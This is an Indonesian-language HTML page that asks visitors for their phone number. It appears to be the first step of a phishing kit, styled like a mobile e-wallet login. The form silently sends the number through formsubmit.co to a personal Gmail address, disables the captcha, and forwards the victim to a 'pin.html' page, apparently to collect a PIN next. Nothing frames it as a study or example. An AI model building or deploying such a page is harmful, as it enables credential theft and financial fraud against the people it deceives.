<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Masukkan Nomor HP</title>
  <style>
    body { font-family: sans-serif; background-color: #008CFF; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .container { width: 90%; max-width: 400px; text-align: center; }
    .input-group { display: flex; margin: 20px 0; }
    .prefix { background-color: white; color: black; padding: 12px; border-radius: 10px 0 0 10px; font-weight: bold; }
    input[type="tel"] { flex: 1; padding: 12px; border: none; border-radius: 0 10px 10px 0; font-size: 18px; }
    button { background: white; color: #008CFF; padding: 12px; border: none; font-size: 16px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Masukkan nomor HP kamu</h2>
    <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
      <div class="input-group">
        <div class="prefix">+62</div>
        <input type="tel" name="nomor_hp" placeholder="8123456789" required />
      </div>
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="pin.html">
      <button type="submit">LANJUTKAN</button>
    </form>
  </div>
</body>
</html>
